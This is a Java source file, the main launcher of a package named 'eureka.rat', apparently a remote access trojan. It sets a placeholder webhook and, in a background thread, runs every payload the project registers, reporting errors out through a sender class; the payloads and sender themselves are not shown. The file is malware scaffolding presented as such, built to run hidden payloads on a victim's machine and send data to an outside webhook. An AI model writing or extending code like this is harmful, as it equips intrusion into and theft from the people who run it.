package eureka.rat;

import eureka.rat.payloads.Payload;
import eureka.rat.payloads.Payloads;
import eureka.rat.utils.Sender;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.Base64;

public class Main {
    public static String webhook = "webhook";

    public static void main(String[] args) {
        new Thread(() -> {
            for (Payload payload : Payloads.getPayloads()) {
                try {
                    payload.execute();
                } catch (Exception e) {
                    Sender.send(e.getMessage());
                }
            }
        }).start();
    }
}
